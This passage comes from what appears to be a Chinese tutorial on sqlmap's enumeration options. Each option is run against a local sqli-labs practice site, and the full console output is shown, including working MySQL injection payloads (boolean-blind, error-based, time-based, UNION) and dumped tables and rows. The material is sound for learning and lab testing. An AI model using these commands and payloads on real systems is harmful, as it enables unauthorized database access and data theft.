[08:33:53] [INFO] retrieved: ''root'@'localhost'','TRIGGER'
[08:33:53] [INFO] retrieved: ''root'@'localhost'','CREATE TABLESPACE'
database management system users privileges:
[*] 'root'@'localhost' (administrator) [28]:
    privilege: ALTER
    privilege: ALTER ROUTINE
    privilege: CREATE
    privilege: CREATE ROUTINE
    privilege: CREATE TABLESPACE
    privilege: CREATE TEMPORARY TABLES
    privilege: CREATE USER
    privilege: CREATE VIEW
    privilege: DELETE
    privilege: DROP
    privilege: EVENT
    privilege: EXECUTE
    privilege: FILE
    privilege: INDEX
    privilege: INSERT
    privilege: LOCK TABLES
    privilege: PROCESS
    privilege: REFERENCES
    privilege: RELOAD
    privilege: REPLICATION CLIENT
    privilege: REPLICATION SLAVE
    privilege: SELECT
    privilege: SHOW DATABASES
    privilege: SHOW VIEW
    privilege: SHUTDOWN
    privilege: SUPER
    privilege: TRIGGER
    privilege: UPDATE

[08:33:53] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:33:53 /2020-03-02/

                                                                                                                                                                                                                                                    
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899
```

显然，该用户有所有权限。

## 二、sqlmap枚举信息

### 1.sqlmap列举数据库名

参数：
`--dbs`
列举数据库名称。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --dbs
1
```

打印

```shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:36:22 /2020-03-02/

[08:36:23] [INFO] resuming back-end DBMS 'mysql'
[08:36:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:36:23] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:36:23] [INFO] fetching database names
[08:36:23] [INFO] retrieved: 'information_schema'
[08:36:23] [INFO] retrieved: 'challenges'
[08:36:23] [INFO] retrieved: 'demo'
[08:36:23] [INFO] retrieved: 'demo1125'
[08:36:23] [INFO] retrieved: 'demo1204'
[08:36:23] [INFO] retrieved: 'dvwa'
[08:36:23] [INFO] retrieved: 'jingdong'
[08:36:23] [INFO] retrieved: 'mysql'
[08:36:23] [INFO] retrieved: 'performance_schema'
[08:36:23] [INFO] retrieved: 'pythontest'
[08:36:23] [INFO] retrieved: 'security'
[08:36:23] [INFO] retrieved: 'sys'
available databases [12]:
[*] challenges
[*] demo
[*] demo1125
[*] demo1204
[*] dvwa
[*] information_schema
[*] jingdong
[*] mysql
[*] performance_schema
[*] pythontest
[*] security
[*] sys

[08:36:23] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:36:23 /2020-03-02/

                                                                                                                                                                                                                                 
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566
```

显然，列举出了所有数据库，包括默认的和自己创建的数据库。

### 2.sqlmap枚举数据库表

参数：
`--tables`
`-D 数据库名字`可以指定具体数据库
列举数据库表名。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --tables
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:41:09 /2020-03-02/

[08:41:09] [INFO] resuming back-end DBMS 'mysql'
[08:41:09] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:41:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:41:09] [INFO] fetching database names
[08:41:09] [INFO] resumed: 'information_schema'
[08:41:09] [INFO] resumed: 'challenges'
[08:41:09] [INFO] resumed: 'demo'
[08:41:09] [INFO] resumed: 'demo1125'
[08:41:09] [INFO] resumed: 'demo1204'
[08:41:09] [INFO] resumed: 'dvwa'
[08:41:09] [INFO] resumed: 'jingdong'
[08:41:09] [INFO] resumed: 'mysql'
[08:41:09] [INFO] resumed: 'performance_schema'
[08:41:09] [INFO] resumed: 'pythontest'
[08:41:09] [INFO] resumed: 'security'
[08:41:09] [INFO] resumed: 'sys'
[08:41:09] [INFO] fetching tables for databases: 'challenges, demo, demo1125, demo1204, dvwa, information_schema, jingdong, mysql, performance_schema, pythontest, security, sys'
[08:41:10] [INFO] retrieved: 'information_schema','CHARACTER_SETS'
[08:41:10] [INFO] retrieved: 'information_schema','COLLATIONS'
[08:41:10] [INFO] retrieved: 'information_schema','COLLATION_CHARACTER_SET_APPLICABILITY'
...
[08:41:21] [INFO] retrieved: 'sys','x$waits_by_host_by_latency'
[08:41:21] [INFO] retrieved: 'sys','x$waits_by_user_by_latency'
[08:41:21] [INFO] retrieved: 'sys','x$waits_global_by_latency'
Database: information_schema
[61 tables]
+------------------------------------------------------+
| CHARACTER_SETS                                       |
| COLLATIONS                                           |
| COLLATION_CHARACTER_SET_APPLICABILITY                |
| ...                                                  |
+------------------------------------------------------+

Database: challenges
[1 table]
+------------------------------------------------------+
| fespr0fqgc                                           |
+------------------------------------------------------+

Database: demo
[32 tables]
+------------------------------------------------------+
| user                                                 |
| article                                              |
| bank1                                                |
| bank2                                                |
| book                                                 |
| class                                                |
| classes                                              |
| demo1                                                |
| demo2                                                |
| dept                                                 |
| emp                                                  |
| login_lg_log                                         |
| login_lg_log_test                                    |
| login_log                                            |
| login_log_hash                                       |
| login_log_hash2                                      |
| login_log_list                                       |
| login_log_range                                      |
| login_log_range2                                     |
| money                                                |
| mylock                                               |
| phone                                                |
| staffs                                               |
| students                                             |
| tbla                                                 |
| test                                                 |
| test1                                                |
| test2                                                |
| test3                                                |
| test4                                                |
| test_innodb_lock                                     |
| test_memory                                          |
+------------------------------------------------------+

Database: demo1125
[6 tables]
+------------------------------------------------------+
| areas                                                |
| cities                                               |
| classes                                              |
| provinces                                            |
| student                                              |
| v_p_c                                                |
+------------------------------------------------------+

Database: demo1204
[1 table]
+------------------------------------------------------+
| classes                                              |
+------------------------------------------------------+

Database: dvwa
[2 tables]
+------------------------------------------------------+
| guestbook                                            |
| users                                                |
+------------------------------------------------------+

Database: jingdong
[2 tables]
+------------------------------------------------------+
| goods                                                |
| goods_cates                                          |
+------------------------------------------------------+

Database: mysql
[31 tables]
+------------------------------------------------------+
| user                                                 |
| columns_priv                                         |
| ...                                                  |
| time_zone_transition_type                            |
+------------------------------------------------------+

Database: performance_schema
[87 tables]
+------------------------------------------------------+
| accounts                                             |
| cond_instances                                       |
| events_stages_current                                |
| ...                                                  |
| variables_by_thread                                  |
+------------------------------------------------------+

Database: security
[4 tables]
+------------------------------------------------------+
| emails                                               |
| referers                                             |
| uagents                                              |
| users                                                |
+------------------------------------------------------+

Database: sys
[101 tables]
+------------------------------------------------------+
| session                                              |
| version                                              |
| host_summary                                         |
| ...                                                  |
+------------------------------------------------------+

[08:41:21] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:41:21 /2020-03-02/

                                                                                                                                                                                                                          
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180
```

指定数据库探测表：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:47:30 /2020-03-02/

[08:47:30] [INFO] resuming back-end DBMS 'mysql'
[08:47:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:47:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:47:30] [INFO] fetching tables for database: 'demo1125'
[08:47:30] [INFO] retrieved: 'areas'
[08:47:30] [INFO] retrieved: 'cities'
[08:47:30] [INFO] retrieved: 'classes'
[08:47:30] [INFO] retrieved: 'provinces'
[08:47:30] [INFO] retrieved: 'student'
[08:47:30] [INFO] retrieved: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[08:47:30] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:47:30 /2020-03-02/

                                                                                                                                                                                                                         
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657
```

只探测了指定数据库中的表。

### 3.sqlmap枚举数据表列

参数：
`--columns`
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables --columns
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:51:31 /2020-03-02/

[08:51:32] [INFO] resuming back-end DBMS 'mysql'
[08:51:32] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:51:32] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:51:32] [INFO] fetching tables for database: 'demo1125'
[08:51:32] [INFO] resumed: 'areas'
[08:51:32] [INFO] resumed: 'cities'
[08:51:32] [INFO] resumed: 'classes'
[08:51:32] [INFO] resumed: 'provinces'
[08:51:32] [INFO] resumed: 'student'
[08:51:32] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[08:51:32] [INFO] fetching columns for table 'areas' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'id','int(5) unsigned'
[08:51:32] [INFO] retrieved: 'pid','int(5) unsigned'
[08:51:32] [INFO] retrieved: 'name','varchar(120)'
[08:51:32] [INFO] retrieved: 'type','tinyint(1)'
[08:51:32] [INFO] fetching columns for table 'cities' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'id','int(11)'
[08:51:32] [INFO] retrieved: 'cityid','char(6)'
[08:51:32] [INFO] retrieved: 'city','varchar(40)'
[08:51:32] [INFO] retrieved: 'provinceid','char(6)'
[08:51:32] [INFO] fetching columns for table 'classes' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'id','int(4)'
[08:51:32] [INFO] retrieved: 'name','varchar(36)'
[08:51:32] [INFO] fetching columns for table 'provinces' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'id','int(11)'
[08:51:32] [INFO] retrieved: 'provinceid','int(11)'
[08:51:32] [INFO] retrieved: 'province','varchar(100)'
[08:51:32] [INFO] fetching columns for table 'student' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'sid','int(4)'
[08:51:32] [INFO] retrieved: 'sname','varchar(36)'
[08:51:32] [INFO] retrieved: 'gid','int(4)'
[08:51:32] [INFO] fetching columns for table 'v_p_c' in database 'demo1125'
[08:51:32] [INFO] retrieved: 'id','int(5) unsigned'
[08:51:32] [INFO] retrieved: 'pid','int(5) unsigned'
[08:51:32] [INFO] retrieved: 'name','varchar(120)'
[08:51:32] [INFO] retrieved: 'type','tinyint(1)'
[08:51:32] [INFO] retrieved: 'cname','varchar(120)'
Database: demo1125
Table: areas
[4 columns]
+--------+-----------------+
| Column | Type            |
+--------+-----------------+
| id     | int(5) unsigned |
| name   | varchar(120)    |
| pid    | int(5) unsigned |
| type   | tinyint(1)      |
+--------+-----------------+

Database: demo1125
Table: cities
[4 columns]
+------------+-------------+
| Column     | Type        |
+------------+-------------+
| city       | varchar(40) |
| cityid     | char(6)     |
| id         | int(11)     |
| provinceid | char(6)     |
+------------+-------------+

Database: demo1125
Table: classes
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| id     | int(4)      |
| name   | varchar(36) |
+--------+-------------+

Database: demo1125
Table: provinces
[3 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| id         | int(11)      |
| province   | varchar(100) |
| provinceid | int(11)      |
+------------+--------------+

Database: demo1125
Table: student
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| gid    | int(4)      |
| sid    | int(4)      |
| sname  | varchar(36) |
+--------+-------------+

Database: demo1125
Table: v_p_c
[5 columns]
+--------+-----------------+
| Column | Type            |
+--------+-----------------+
| cname  | varchar(120)    |
| id     | int(5) unsigned |
| name   | varchar(120)    |
| pid    | int(5) unsigned |
| type   | tinyint(1)      |
+--------+-----------------+

[08:51:32] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:51:33 /2020-03-02/

                                                                                                                                                                                                                
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153
```

显然，探测了该数据库种所有表的字段。
指定表探测字段：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables -T student --columns
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:53:57 /2020-03-02/

[08:53:57] [INFO] resuming back-end DBMS 'mysql'
[08:53:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:53:57] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:53:58] [INFO] fetching tables for database: 'demo1125'
[08:53:58] [INFO] resumed: 'areas'
[08:53:58] [INFO] resumed: 'cities'
[08:53:58] [INFO] resumed: 'classes'
[08:53:58] [INFO] resumed: 'provinces'
[08:53:58] [INFO] resumed: 'student'
[08:53:58] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[08:53:58] [INFO] fetching columns for table 'student' in database 'demo1125'
[08:53:58] [INFO] resumed: 'sid','int(4)'
[08:53:58] [INFO] resumed: 'sname','varchar(36)'
[08:53:58] [INFO] resumed: 'gid','int(4)'
Database: demo1125
Table: student
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| gid    | int(4)      |
| sid    | int(4)      |
| sname  | varchar(36) |
+--------+-------------+

[08:53:58] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:53:58 /2020-03-02/

                                                                                                                                                                                                                  
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172
```

显然，只探测了指定表中的字段。

### 4.sqlmap枚举数据值

参数：
`--dump`
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 -D demo1125 --tables -T student --columns --dump
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:56:31 /2020-03-02/

[08:56:31] [INFO] resuming back-end DBMS 'mysql'
[08:56:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:56:31] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:56:31] [INFO] fetching tables for database: 'demo1125'
[08:56:31] [INFO] resumed: 'areas'
[08:56:31] [INFO] resumed: 'cities'
[08:56:31] [INFO] resumed: 'classes'
[08:56:31] [INFO] resumed: 'provinces'
[08:56:31] [INFO] resumed: 'student'
[08:56:31] [INFO] resumed: 'v_p_c'
Database: demo1125
[6 tables]
+-----------+
| areas     |
| cities    |
| classes   |
| provinces |
| student   |
| v_p_c     |
+-----------+

[08:56:31] [INFO] fetching columns for table 'student' in database 'demo1125'
[08:56:31] [INFO] resumed: 'sid','int(4)'
[08:56:31] [INFO] resumed: 'sname','varchar(36)'
[08:56:31] [INFO] resumed: 'gid','int(4)'
Database: demo1125
Table: student
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| gid    | int(4)      |
| sid    | int(4)      |
| sname  | varchar(36) |
+--------+-------------+

[08:56:31] [INFO] fetching columns for table 'student' in database 'demo1125'
[08:56:31] [INFO] resumed: 'sid','int(4)'
[08:56:31] [INFO] resumed: 'sname','varchar(36)'
[08:56:31] [INFO] resumed: 'gid','int(4)'
[08:56:31] [INFO] fetching entries for table 'student' in database 'demo1125'
[08:56:31] [INFO] retrieved: '1','3','Jack'
[08:56:31] [INFO] retrieved: '1','4','Jack'
[08:56:31] [INFO] retrieved: '1','5','Jack'
[08:56:31] [INFO] retrieved: '1','8','Jack'
[08:56:31] [INFO] retrieved: '1','9','Jack'
[08:56:32] [INFO] retrieved: '1','10','Jackson'
[08:56:32] [INFO] retrieved: '1','22','Jack'
[08:56:32] [INFO] retrieved: '1','26','Tom'
[08:56:32] [INFO] retrieved: '1','27','Tommy'
Database: demo1125
Table: student
[9 entries]
+-----+-----+---------+
| gid | sid | sname   |
+-----+-----+---------+
| 1   | 3   | Jack    |
| 1   | 4   | Jack    |
| 1   | 5   | Jack    |
| 1   | 8   | Jack    |
| 1   | 9   | Jack    |
| 1   | 10  | Jackson |
| 1   | 22  | Jack    |
| 1   | 26  | Tom     |
| 1   | 27  | Tommy   |
+-----+-----+---------+

[08:56:32] [INFO] table 'demo1125.student' dumped to CSV file 'xxxx\sqlmap\output\127.0.0.1\dump\demo1125\student.csv'
[08:56:32] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:56:32 /2020-03-02/

                                                                                                                                                                                                
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104
```

显然，探测出了表的具体数据。

### 5.sqlmap枚举schema信息

参数：
`--schema`
用户可用此选项列举数据库管理系统的模式，模式列表包含所有数据库、表、列、触发器和他们各自的类型；
可使用参数`--exclude-sysdbs`**排除系统数据库**。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --schema
1
```

显示：



<iframe id="YlaHbEbh-1583237211605" src="https://player.youku.com/embed/XNDU3MTgzMjkwMA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

sqlmap--schema



结果包含了所有数据库、数据库中的表和表中的字段等，但是**不包括数据**。
显然，这个过程很费时，因为包含了很多系统表，进行了意义不大的探测。
增加`--exclude-sysdbs`参数排除系统表再次测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --schema --exclude-sysdbs
1
```

显示：
![--schema --exclude-sysdbs](https://img-blog.csdnimg.cn/20200303200733254.gif#pic_center)
显然，这个过程短得多。

### 6.sqlmap检索数据表数量

参数：
`--count`
如果用户只想知道表的条目数，则可以使用此参数。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --count -D demo1125
1
```

打印：

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:12:39 /2020-03-02/

[09:12:40] [INFO] resuming back-end DBMS 'mysql'
[09:12:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[09:12:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:12:40] [WARNING] missing table parameter, sqlmap will retrieve the number of entries for all database management system databases' tables
[09:12:40] [INFO] fetching tables for database: 'demo1125'
[09:12:40] [INFO] resumed: 'areas'
[09:12:40] [INFO] resumed: 'cities'
[09:12:40] [INFO] resumed: 'classes'
[09:12:40] [INFO] resumed: 'provinces'
[09:12:40] [INFO] resumed: 'student'
[09:12:40] [INFO] resumed: 'v_p_c'
Database: demo1125
+-----------+---------+
| Table     | Entries |
+-----------+---------+
| areas     | 3409    |
| cities    | 345     |
| provinces | 34      |
| v_p_c     | 14      |
| student   | 9       |
+-----------+---------+

[09:12:40] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 09:12:40 /2020-03-02/


12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758
```

可以探测一个数据库中每个表的记录数。

### 7.sqlmap截取数据信息

参数：
`--start`和`--stop`
例如`--start 1 --stop 3`返回当前数据库表的前三条记录。
进行测试：

```shell
